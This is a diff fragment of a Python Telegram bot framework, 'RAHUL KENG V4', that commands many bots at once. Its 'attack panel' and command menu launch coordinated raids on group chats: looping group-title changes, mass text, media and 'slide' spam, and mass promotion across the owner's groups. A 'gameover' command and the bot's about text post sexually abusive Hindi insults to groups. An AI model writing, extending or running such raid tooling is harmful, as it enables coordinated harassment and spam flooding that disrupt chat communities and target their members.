+    if not message.photo and not (message.reply_to_message and message.reply_to_message.photo):
+
+
+
+        return await safe_reply(message, font("⚠️ Please send this command as a caption to a photo or reply to a photo."))
+
+
+
+        
+
+
+
+    photo = message.photo[-1] if message.photo else message.reply_to_message.photo[-1]
+
+
+
+    await bot.download(photo, destination=START_PIC_PATH)
+
+
+
+    
+
+
+
+    await safe_reply(message, font("✅ Permanent Start picture updated globally for ALL bots!"))
+
+
+
+    await send_start_menu(message, bot)
+
+
+
+
+
+
+
+@dp.channel_post(Command("setmenupic", prefix="/!"))
+
+
+
+@dp.message(Command("setmenupic", prefix="/!"))
+
+
+
+async def cmd_setmenupic(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_owner(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    if not message.photo and not (message.reply_to_message and message.reply_to_message.photo):
+
+
+
+        return await safe_reply(message, font("⚠️ Please reply to a photo with `!setmenupic`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    photo = message.photo[-1] if message.photo else message.reply_to_message.photo[-1]
+
+
+
+    await bot.download(photo, destination=START_PIC_PATH)
+
+
+
+    
+
+
+
+    await safe_reply(message, font("✅ Global menu picture updated successfully for ALL bots!"))
+
+
+
+    await send_start_menu(message, bot)
+
+
+
+
+
+
+
+@dp.channel_post(Command("resetmenupic", prefix="/!"))
+
+
+
+@dp.message(Command("resetmenupic", prefix="/!"))
+
+
+
+async def cmd_resetmenupic(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_owner(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    if os.path.exists(START_PIC_PATH):
+
+
+
+        os.remove(START_PIC_PATH)
+
+
+
+        await safe_reply(message, font("🗑 Global menu picture reset successfully! Start menus are now text-only for all bots."))
+
+
+
+    else:
+
+
+
+        await safe_reply(message, font("⚠️ No custom menu picture is currently set."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("start", prefix="/!"))
+
+
+
+@dp.message(Command("start", prefix="/!"))
+
+
+
+async def cmd_start(message: types.Message, bot: Bot):
+
+
+
+    await send_start_menu(message, bot)
+
+
+
+
+
+
+
+@dp.channel_post(Command("menu", prefix="-./X!"))
+
+
+
+@dp.message(Command("menu", prefix="-./X!"))
+
+
+
+async def cmd_menu(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    menu_text = f"""
+
+        ❤️‍🔥 {font("RAHUL KENG V4")}
+
+
+        ⚔️ {font("ATTACK & GAMEOVER")}
+
+
+✘ `!attack <text>` / `!gattack <text>` ➜ {font("Interactive attack panel")}
+
+
+
+✘ `!gameover <text>` / `!ggameover <text>` ➜ {font("Send game-over report (Owner only)")}
+
+╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+
+        🤍 {font("NAME CHANGE (NC)")}
+
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+✘ `!snc <text>` / `!dsnc` (Use `!g` prefix for ALL Lord groups)
+
+✘ `!nc <name>` / `!dnc`
+
+✘ `!emo <text>` / `!demo`
+
+✘ `!kengnc <name>` / `!dkengnc`
+
+✘ `!RAHULnc <name>` / `!dRAHULnc`
+
+✘ `!spmnc <text>` / `!dspmnc`
+
+✘ `!delaync <ms>` ➜ {font("Default: 500ms")}
+
+╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+
+
+        📸 {font("MEDIA & STICKER")}
+
+
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+✘ `!makesticker <text>` ➜ {font("Sticker Studio")}
+
+
+✘ `!tts <text>` ➜ {font("Voice Studio")}
+
+✘ `!stickerspm` / `!dstickerspm`
+
+✘ `!gifspm` / `!dgifspm`
+
+✘ `!mediaspm` / `!dmediaspm`
+
+✘ `!voicespam` / `!dvoicespm`
+
+✘ `!pfp` / `!dpfp` / `!gpfp`
+
+✘ `!save` / `!del` / `!gsave` (reply)
+
+✘ `!delaypfp <ms>` / `!delallmedia`
+
+╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+
+        ❤️‍🩹 {font("SLIDE & SPAM")}
+
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+✘ `!forwardspm` / `!dforwardspm`
+
+✘ `!targetslide <name>` / `!dtargetslide`
+
+✘ `!slidespam <text>` / `!dslidespam`
+
+✘ `!spm <text>` / `!dspm` (Prefix `!g` e.g., `!gspm` for Lord groups)
+
+✘ `!RAHULspam <text>` / `!dRAHULspam`
+
+✘ `!rspm <name>` / `!drspm`
+
+✘ `!dallspm` / `!gdall` ➜ {font("Kill All spams")}
+
+✘ `!delaygcspm` / `!delayrspm` <ms>
+
+╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+
+        🥱 {font("REPLY & REACT")}
+
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+✘ `!replyRAHUL` / `!dreplyRAHUL`
+
+✘ `!react <emoji>` / `!dreact`
+
+✘ `!swipe <name>` / `!dswipe`
+
+╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+
+        🤫 {font("MUTE & ADMIN")}
+
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+
+✘ `!mute` / `!unmute` (reply/tag)
+
+✘ `!mutelist` / `!listsudo`
+
+✘ `!promoteall` / `!promoteallbots`
+
+✘ `!gpromote` / `!gdemote` ➜ {font("Promote/demote across Lord groups")}
+
+✘ `!addgroup` / `!delgroup` / `!listgroup`
+
+✘ `!addsudo` / `!delsudo`
+
+╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+
+        ⚙️ {font("SYSTEM CONTROL")}
+
+╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+
+✘ `!setmenupic` / `!resetmenupic` ➜ {font("Manage global start menu picture")}
+
+✘ `!startpfp` / `!activebots` / `!missingbots`
+
+✘ `!broadcast` / `!getlink` /  `!getallactivelinks`
+
+✘ `!status` / `!uptime` / `!ping` / `!on`
+
+✘ `!o` ➜ {font("Optimize & Clear Cache")}
+
+✘ `!leave` ➜ {font("All Bots Leave")}
+
+✘ `!dall` ➜ {font("Stop All Tasks")}
+
+
+
+"""
+
+
+
+    await safe_reply(message, menu_text, parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("makesticker", prefix="-./X!"))
+
+
+
+@dp.message(Command("makesticker", prefix="-./X!"))
+
+
+
+async def cmd_makesticker(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    exact_text = get_exact_text(message)
+
+
+
+    if not exact_text:
+
+
+
+        return await safe_reply(message, font("⚠️ Please provide text to make a sticker! Example: `!makesticker Hello`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    if not HAS_PIL:
+
+
+
+        return await safe_reply(message, font("⚠️ Pillow library is not installed on your server! The Sticker Studio requires it. Install via `pip install Pillow`."))
+
+
+
+        
+
+
+
+    task_id = str(uuid.uuid4())[:8]
+
+
+
+    active_menus[task_id] = {"cmd": "makesticker", "text": exact_text, "color": "black", "font": "default"}
+
+
+
+    
+
+
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔴 Red", callback_data=f"stk_{task_id}_c_red"),
+
+
+
+         InlineKeyboardButton(text="🔵 Blue", callback_data=f"stk_{task_id}_c_blue"),
+
+
+
+         InlineKeyboardButton(text="🟢 Green", callback_data=f"stk_{task_id}_c_green")],[InlineKeyboardButton(text="🟡 Yellow", callback_data=f"stk_{task_id}_c_yellow"),
+
+
+
+         InlineKeyboardButton(text="⚫ Black", callback_data=f"stk_{task_id}_c_black"),
+
+
+
+         InlineKeyboardButton(text="⚪ White", callback_data=f"stk_{task_id}_c_white")],[InlineKeyboardButton(text="🖋 Standard Font", callback_data=f"stk_{task_id}_f_default"),
+
+
+
+         InlineKeyboardButton(text="🔠 Bold Font", callback_data=f"stk_{task_id}_f_bold")],[InlineKeyboardButton(text="🚀 GENERATE STICKER", callback_data=f"stk_{task_id}_gen")]
+
+
+
+    ])
+
+
+
+    await message.reply(font("🎨 **STICKER STUDIO**\nChoose background and font below:"), reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("tts", prefix="-./X!"))
+
+
+
+@dp.message(Command("tts", prefix="-./X!"))
+
+
+
+async def cmd_tts(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    exact_text = get_exact_text(message)
+
+
+
+    if not exact_text:
+
+
+
+        return await safe_reply(message, font("⚠️ Please provide text to speak! Example: `!tts Hello there`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    task_id = str(uuid.uuid4())[:8]
+
+
+
+    active_menus[task_id] = {"cmd": "tts", "text": exact_text}
+
+
+
+    
+
+
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🇬🇧 English", callback_data=f"tts_{task_id}_en"),
+
+
+
+         InlineKeyboardButton(text="🇮🇳 Hindi", callback_data=f"tts_{task_id}_hi"),
+
+
+
+         InlineKeyboardButton(text="🇸🇦 Arabic", callback_data=f"tts_{task_id}_ar")],[InlineKeyboardButton(text="🇷🇺 Russian", callback_data=f"tts_{task_id}_ru"),
+
+
+
+         InlineKeyboardButton(text="🇪🇸 Spanish", callback_data=f"tts_{task_id}_es"),
+
+
+
+         InlineKeyboardButton(text="🇫🇷 French", callback_data=f"tts_{task_id}_fr")],[InlineKeyboardButton(text="🇯🇵 Japanese", callback_data=f"tts_{task_id}_ja"),
+
+
+
+         InlineKeyboardButton(text="🇩🇪 German", callback_data=f"tts_{task_id}_de"),
+
+
+
+         InlineKeyboardButton(text="🇨🇳 Chinese", callback_data=f"tts_{task_id}_zh-CN")]
+
+
+
+    ])
+
+
+
+    await message.reply(font("🗣 **VOICE STUDIO**\nSelect language for precise slang/speech:"), reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.callback_query(F.data.startswith("start_"))
+
+
+
+async def start_callback_handler(query: types.CallbackQuery):
+
+
+
+    if query.data == "start_about":
+
+
+
+        owner_name = font(user_names.get(OWNER_ID, 'Owner'))
+
+
+
+        owner_acc = f"[{owner_name}](tg://user?id={OWNER_ID})"
+
+
+
+        
+
+
+
+        text_part1 = font("I am a bot created by ")
+
+
+
+        text_part2 = font("❗. ")
+
+
+
+        text_part3 = font(" 👈iske kehne pe me teri ma v chod skta hu 😹💘.")
+
+
+
+        about_text = f"{text_part1}{owner_acc}{text_part2}{owner_acc}{text_part3}"
+
+
+
+        
+
+
+
+        await query.message.answer(about_text, parse_mode=ParseMode.MARKDOWN)
+
+
+
+        await query.answer()
+
+
+
+        
+
+
+
+    elif query.data == "start_restricted":
+
+
+
+        if query.from_user.id in SUDO_USERS:
+
+
+
+            await query.answer(font("✅ Access Granted. Use !help to see commands."), show_alert=True)
+
+
+
+        else:
+
+
+
+            await query.answer(font("⚠️ Ask owner to give you access ❤️"), show_alert=True)
+
+
+
+
+
+
+
+@dp.channel_post(Command("activebots", prefix="-./X!"))
+
+
+
+@dp.message(Command("activebots", prefix="-./X!"))
+
+
+
+async def cmd_activebots(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    text = font("❓ Active Bots:\n\n") + "\n".join(f"• @{u}" for u in bot_usernames) + font(f"\n\n✅ Total Bots: {len(bots)}")
+
+
+
+    await safe_reply(message, text, parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("missingbots", prefix="-./X!"))
+
+
+
+@dp.message(Command("missingbots", prefix="-./X!"))
+
+
+
+async def cmd_missingbots(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    missing = []
+
+
+
+    for i, b in enumerate(bots):
+
+
+
+        try:
+
+
+
+            member = await b.get_chat_member(message.chat.id, b.id)
+
+
+
+            if member.status in ['left', 'kicked', 'banned']: missing.append(bot_usernames[i])
+
+
+
+        except Exception:
+
+
+
+            missing.append(bot_usernames[i])
+
+
+
+    if not missing:
+
+
+
+        return await safe_reply(message, font("✅ All bots are already in this group/channel!"))
+
+
+
+    await safe_reply(message, font("🕵️‍♂️ **Missing Bots:**\n\n") + "\n".join(f"• @{u}" for u in missing), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("leave", prefix="-./X!"))
+
+
+
+@dp.message(Command("leave", prefix="-./X!"))
+
+
+
+async def cmd_leave(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    await safe_reply(message, font("👋 All bots are leaving this chat!"))
+
+
+
+    for b in bots:
+
+
+
+        try:
+
+
+
+            await b.leave_chat(message.chat.id)
+
+
+
+        except Exception: pass
+
+
+
+
+
+
+
+@dp.channel_post(Command("ping", prefix="-./X!"))
+
+
+
+@dp.message(Command("ping", prefix="-./X!"))
+
+
+
+async def cmd_ping(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    await safe_reply(message, font(f"🏓 Pong! ✅ {random.randint(30, 90)} ms"))
+
+
+
+
+
+
+
+@dp.channel_post(Command("myid", prefix="-./X!"))
+
+
+
+@dp.message(Command("myid", prefix="-./X!"))
+
+
+
+async def cmd_myid(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    auth_id = get_auth_id(message)
+
+
+
+    await safe_reply(message, font(f"🆔 Extracted Authorization ID: `{auth_id}`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("o", prefix="-./X!"))
+
+
+
+@dp.message(Command("o", prefix="-./X!"))
+
+
+
+async def cmd_optimize(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    save_db()
+
+
+
+    await safe_reply(message, font("✨ System optimized and Database saved."))
+
+
+
+
+
+
+
+# ==================== GAMEOVER COMMAND (@only_owner) ====================
+
+
+
+@dp.channel_post(Command("gameover", "ggameover", prefix="-./X!"))
+
+
+
+@dp.message(Command("gameover", "ggameover", prefix="-./X!"))
+
+
+
+async def cmd_gameover(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_owner(get_auth_id(message)):
+
+
+
+        return await safe_reply(message, font("❌ Only OWNER can use this command."))
+
+
+
+
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+
+
+
+
+    ist = timezone(timedelta(hours=5, minutes=30))
+
+
+
+    now_ist = datetime.now(ist)
+
+
+
+    current_time = now_ist.strftime("%I:%M:%S %p")
+
+
+
+    current_date = now_ist.strftime("%d %B %Y")
+
+
+
+
+
+
+
+    user = message.from_user
+
+
+
+    name = (
+
+
+
+        f"@{user.username}"
+
+
+
+        if user and user.username
+
+
+
+        else (user.first_name if user else "UNKNOWN USER")
+
+
+
+    )
+
+
+
+    chat = message.chat
+
+
+
+    group_name = chat.title if chat and chat.title else "𝙐𝙉𝙆𝙉𝙊𝙒𝙉 𝙂𝙍𝙊𝙐𝙋"
+
+
+
+    
+
+
+
+    custom_text = get_exact_text(message)
+
+
+
+    extra_msg = f"\n💬 ᴍᴇssᴀɢᴇ - {custom_text}\n" if custom_text else ""
+
+
+
+
+
+
+
+    text = (
+
+
+
+        f"═════════════════════════\n"
+
+
+
+        f"Ꮐᴀᴍᴇ ꪮᴠᴇʀ Ͳɪᴍᴇ - {current_time}\n"
+
+
+
+        f"Ꭰᴀᴛᴇ - {current_date} (IST)\n\n"
+
+
+
+        f"Ꭺʙʙ Ᏼᴀᴀᴘ Ꮶᴇ Ꭺɢɢᴇ\n"
+
+
+
+        f"Ꮋᴀᴡᴀʙᴀᴢᴢɪ Ꮶᴀʀɴᴇ Ꮇᴛᴛ Ꭺɴᴀᴀ\n\n"
+
+
+
+        f"{extra_msg}"
+
+
+
+        f"Ꮐʀᴏᴜᴘ - {group_name}\n\n"
+
+
+
+        f"Ͳᴇʀɪ Ꮇᴀᴀ Ꮯʜᴜᴅ Ꮶᴇ Ꭰꜰɴ Ᏼʏ - {name}\n"
+
+
+
+        f"═════════════════════════"
+
+
+
+    )
+
+
+
+
+
+
+
+    for c_id in target_chats:
+
+
+
+        try:
+
+
+
+            await bot.send_message(chat_id=c_id, text=text)
+
+
+
+        except Exception as e:
+
+
+
+            print(f"{RED}[GAME OVER] Error sending to {c_id}: {e}{RESET}")
+
+
+
+
+
+
+
+# ==================== ATTACK COMMAND & PANEL ====================
+
+
+
+@dp.channel_post(Command("attack", "gattack", prefix="-./X!"))
+
+
+
+@dp.message(Command("attack", "gattack", prefix="-./X!"))
+
+
+
+async def cmd_attack(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    exact_text = get_exact_text(message)
+
+
+
+    if not exact_text:
+
+
+
+        return await safe_reply(message, font("⚠️ Please provide text for attack! Example: `!attack Hello`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    task_id = str(uuid.uuid4())[:8]
+
+
+
+    active_menus[task_id] = {
+
+
+
+        "cmd": "attack_menu", 
+
+
+
+        "text": exact_text, 
+
+
+
+        "chat_id": message.chat.id,
+
+
+
+        "is_lord": is_lord
+
+
+
+    }
+
+
+
+    
+
+
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+
+
+
+        [InlineKeyboardButton(text="🤍 SNC Attack", callback_data=f"atk_{task_id}_snc"),
+
+
+
+         InlineKeyboardButton(text="🤍 NC Attack", callback_data=f"atk_{task_id}_nc")],
+
+
+
+        [InlineKeyboardButton(text="🤍 Emo NC", callback_data=f"atk_{task_id}_emo"),
+
+
+
+         InlineKeyboardButton(text="🤍 Keng NC", callback_data=f"atk_{task_id}_kengnc")],
+
+
+
+        [InlineKeyboardButton(text="🤍 RAHUL NC", callback_data=f"atk_{task_id}_RAHULnc"),
+
+
+
+         InlineKeyboardButton(text="🤍 Spm NC", callback_data=f"atk_{task_id}_spmnc")],
+
+
+
+        [InlineKeyboardButton(text="❤️‍🩹 Text SPM", callback_data=f"atk_{task_id}_spm"),
+
+
+
+         InlineKeyboardButton(text="❤️‍🩹 RAHUL SPM", callback_data=f"atk_{task_id}_RAHULspam")],
+
+
+
+        [InlineKeyboardButton(text="❤️‍🩹 Raid RSPM", callback_data=f"atk_{task_id}_rspm"),
+
+
+
+         InlineKeyboardButton(text="❤️‍🩹 Slide Spam", callback_data=f"atk_{task_id}_slidespam")],
+
+
+
+        [InlineKeyboardButton(text="✖ Close", callback_data=f"atk_{task_id}_close")]
+
+
+
+    ])
+
+
+
+    
+
+
+
+    await message.reply(
+
+
+
+        f"⚔️ **{font('ATTACK PANEL')}**\n{font('Target text:')} `{exact_text}`\n{font('Click any button below to launch attack with this text:')}",
+
+
+
+        reply_markup=kb,
+
+
+
+        parse_mode=ParseMode.MARKDOWN
+
+
+
+    )
+
+
+
+
+
+
+
+@dp.callback_query(F.data.startswith("atk_"))
+
+
+
+async def attack_callback_handler(query: types.CallbackQuery, bot: Bot):
+
+
+
+    if query.from_user.id not in SUDO_USERS:
+
+
+
+        return await query.answer("SUDO access required.", show_alert=True)
+
+
+
+        
+
+
+
+    data = query.data.split("_")
+
+
+
+    if len(data) < 3:
+
+
+
+        return await query.answer("Invalid data.", show_alert=True)
+
+
+
+        
+
+
+
+    task_id = data[1]
+
+
+
+    action = data[2]
+
+
+
+    
+
+
+
+    menu = active_menus.get(task_id)
+
+
+
+    if not menu or menu.get("cmd") != "attack_menu":
+
+
+
+        return await query.answer("Menu expired.", show_alert=True)
+
+
+
+        
+
+
+
+    if action == "close":
+
+
+
+        try: await query.message.edit_text("Attack menu closed.")
+
+
+
+        except Exception: pass
+
+
+
+        return await query.answer()
+
+
+
+        
+
+
+
+    text = menu["text"]
+
+
+
+    is_lord = menu["is_lord"]
+
+
+
+    target_chats = get_target_chats(query.message, is_lord)
+
+
+
+    
+
+
+
+    await query.answer(f"🚀 Launching {action.upper()} with text: {text}")
+
+
+
+    
+
+
+
+    if action == "snc":
+
+
+
+        for c_id in target_chats:
+
+
+
+            active_bots = []
+
+
+
+            for b in bots:
+
+
+
+                try:
+
+
+
+                    member = await b.get_chat_member(c_id, b.id)
+
+
+
+                    if member.status not in ['left', 'kicked', 'banned']:
+
+
+
+                        active_bots.append(b)
+
+
+
+                except Exception:
+
+
+
+                    pass
+
+
+
+            if active_bots:
+
+
+
+                tid = str(uuid.uuid4())
+
+
+
+                seq_nc_tasks[c_id] = tid
+
+
+
+                asyncio.create_task(seq_nc_worker(c_id, text, active_bots, tid))
+
+
+
+        await query.message.reply(font(f"🚀 SNC Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    elif action == "nc":
+
+
+
+        for c_id in target_chats:
+
+
+
+            if c_id not in group_tasks: group_tasks[c_id] = {}
+
+
+
+            for b in bots:
+
+
+
+                tid = str(uuid.uuid4())
+
+
+
+                group_tasks[c_id][b.id] = tid
+
+
+
+                asyncio.create_task(nc_loop_worker(b, c_id, text, tid))
+
+
+
+        await query.message.reply(font(f"🔄 NC Raid Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    elif action == "emo":
+
+
+
+        for c_id in target_chats:
+
+
+
+            if c_id not in group_tasks: group_tasks[c_id] = {}
+
+
+
+            for b in bots:
+
+
+
+                tid = str(uuid.uuid4())
+
+
+
+                group_tasks[c_id][b.id] = tid
+
+
+
+                asyncio.create_task(emo_loop_worker(b, c_id, text, tid))
+
+
+
+        await query.message.reply(font(f"🔄 Emoji NC Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    elif action == "kengnc":
+
+
+
+        for c_id in target_chats:
+
+
+
+            if c_id not in keng_tasks: keng_tasks[c_id] = {}
+
+
+
+            for b in bots:
+
+
+
+                tid = str(uuid.uuid4())
+
+
+
+                keng_tasks[c_id][b.id] = tid
+
+
+
+                asyncio.create_task(keng_loop_worker(b, c_id, text, tid))
+
+
+
+        await query.message.reply(font(f"🔺 KENG NC Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    elif action == "RAHULnc":
+
+
+
+        for c_id in target_chats:
+
+
+
+            if c_id not in RAHULnc_tasks: RAHULnc_tasks[c_id] = {}
+
+
+
+            for b in bots:
+
+
+
+                tid = str(uuid.uuid4())
+
+
+
+                RAHULnc_tasks[c_id][b.id] = tid
+
+
+
+                asyncio.create_task(RAHULnc_loop_worker(b, c_id, text, tid))
+
+
+
+        await query.message.reply(font(f"🔺 RAHUL NC Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    elif action == "spmnc":
+
+
+
+        for c_id in target_chats:
+
+
+
+            if c_id not in spmnc_tasks: spmnc_tasks[c_id] = {}
+
+
+
+            for b in bots:
+
+
+
+                tid = str(uuid.uuid4())
+
+
+
+                spmnc_tasks[c_id][b.id] = tid
+
+
+
+                asyncio.create_task(spmnc_worker(b, c_id, text, tid))
+
+
+
+        await query.message.reply(font(f"⚡ SPMNC Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    elif action == "spm":
+
+
+
+        for c_id in target_chats:
+
+
+
+            if c_id not in spm_loop_tasks: spm_loop_tasks[c_id] = []
+
+
+
+            for i, b in enumerate(bots):
+
+
+
+                tid = str(uuid.uuid4())
+
+
+
+                spm_loop_tasks[c_id].append(tid)
+
+
+
+                asyncio.create_task(delayed_task(i * 0.15, spm_sender(b, c_id, None, text, spm_loop_tasks, c_id, tid)))
+
+
+
+        await query.message.reply(font(f"✅ Text SPM Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    elif action == "RAHULspam":
+
+
+
+        for c_id in target_chats:
+
+
+
+            if c_id not in RAHULspam_tasks: RAHULspam_tasks[c_id] = []
+
+
+
+            for i, b in enumerate(bots):
+
+
+
+                tid = str(uuid.uuid4())
+
+
+
+                RAHULspam_tasks[c_id].append(tid)
+
+
+
+                asyncio.create_task(delayed_task(i * 0.15, RAHULspam_sender(b, c_id, text, RAHULspam_tasks, tid)))
+
+
+
+        await query.message.reply(font(f"🔥 RAHUL Spam Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    elif action == "rspm":
+
+
+
+        for c_id in target_chats:
+
+
+
+            if c_id not in rspm_tasks: rspm_tasks[c_id] = []
+
+
+
+            for i, b in enumerate(bots):
+
+
+
+                tid = str(uuid.uuid4())
+
+
+
+                rspm_tasks[c_id].append(tid)
+
+
+
+                asyncio.create_task(delayed_task(i * 0.15, rspm_sender(b, c_id, text, rspm_tasks, tid)))
+
+
+
+        await query.message.reply(font(f"🔥 RSPM Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    elif action == "slidespam":
+
+
+
+        for c_id in target_chats:
+
+
+
+            if c_id not in spm_loop_tasks: spm_loop_tasks[c_id] = []
+
+
+
+            for i, b in enumerate(bots):
+
+
+
+                tid = str(uuid.uuid4())
+
+
+
+                spm_loop_tasks[c_id].append(tid)
+
+
+
+                asyncio.create_task(delayed_task(i * 0.15, spm_sender(b, c_id, None, text, spm_loop_tasks, c_id, tid)))
+
+
+
+        await query.message.reply(font(f"💥 Slide/Text SPM Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+# ==================== help MENU COMMAND ====================
+
+
+
+def build_help_main_keyboard():
+
+
+
+    return InlineKeyboardMarkup(inline_keyboard=[
+
+
+
+        [InlineKeyboardButton(text=f"🤍 {font('NC SECTION')}", callback_data="help_cat_nc")],
+
+
+
+        [InlineKeyboardButton(text=f"❤️‍🩹 {font('SPAM & SLIDE')}", callback_data="help_cat_spam")],
+
+
+
+        [InlineKeyboardButton(text=f"📸 {font('MEDIA & STICKER')}", callback_data="help_cat_media")],
+
+
+
+        [InlineKeyboardButton(text=f"🥱 {font('REPLY & REACT')}", callback_data="help_cat_reply")],
+
+
+
+        [InlineKeyboardButton(text=f"🤫 {font('ADMIN & SYSTEM')}", callback_data="help_cat_admin")],
+
+
+
+        [InlineKeyboardButton(text=f"✖ {font('CLOSE')}", callback_data="help_close")]
+
+
+
+    ])
+
+
+
+
+
+
+
+@dp.message(Command("help", prefix="-./X!"))
+
+
+
+async def cmd_help(message: types.Message, bot: Bot):
+
+
+
+    if not is_sudo(get_auth_id(message)):
+
+
+
+        return
+
+
+
+    await safe_reply(
+
+
+
+        message, 
+
+
+
+        f"🎛 **{font('COMMAND MENU')}**\n{font('Select a category below to view all commands in text format:')}", 
+
+
+
+        reply_markup=build_help_main_keyboard(),
+
+
+
+        parse_mode=ParseMode.MARKDOWN
+
+
+
+    )
+
+
+
+
+
+
+
+@dp.callback_query(F.data.startswith("help_"))
+
+
+
+async def help_menu_callback(query: types.CallbackQuery):
+
+
+
+    if not is_sudo(query.from_user.id):
+
+
+
+        return await query.answer("SUDO access required.", show_alert=True)
+
+
+
+    
+
+
+
+    action = query.data.removeprefix("help_")
+
+
+
+    
+
+
+
+    if action == "close":
+
+
+
+        try: await query.message.edit_text("Menu closed.")
+
+
+
+        except Exception: pass
+
+
+
+        return await query.answer()
+
+
+
+
+
+
+
+    if action == "main":
+
+
+
+        await query.message.edit_text(
+
+
+
+            f"🎛 **{font('COMMAND MENU')}**\n{font('Select a category below to view all commands in text format:')}",
+
+
+
+            reply_markup=build_help_main_keyboard(),
+
+
+
+            parse_mode=ParseMode.MARKDOWN
+
+
+
+        )
+
+
+
+        return await query.answer()
+
+
+
+
+
+
+
+    back_kb = InlineKeyboardMarkup(inline_keyboard=[
+
+
+
+        [InlineKeyboardButton(text="🔙 Back", callback_data="help_main"), InlineKeyboardButton(text="✖ Close", callback_data="help_close")]
+
+
+
+    ])
+
+
+
+
+
+
+
+    if action == "cat_nc":
+
+
+
+        text = f"""
+
+
+
+🤍 **{font("NAME CHANGE (NC) COMMANDS")}**
+
+
+
+
+
+
+
+• `!snc <text>` ➜ {font("Start sequential multi-bot title change")}
+
+
+
+• `!dsnc` ➜ {font("Stop sequential NC")}
+
+
+
+• `!nc <name>` ➜ {font("Start raid title change loop")}
+
+
+
+• `!dnc` ➜ {font("Stop raid title change")}
+
+
+
+• `!emo <text>` ➜ {font("Emoji title change loop")}
+
+
+
+• `!demo` ➜ {font("Stop emoji NC")}
+
+
+
+• `!kengnc <name>` ➜ {font("KENG template title change")}
+
+
+
+• `!dkengnc` ➜ {font("Stop KENG NC")}
+
+
+
+• `!RAHULnc <name>` ➜ {font("RAHUL pattern title change")}
+
+
+
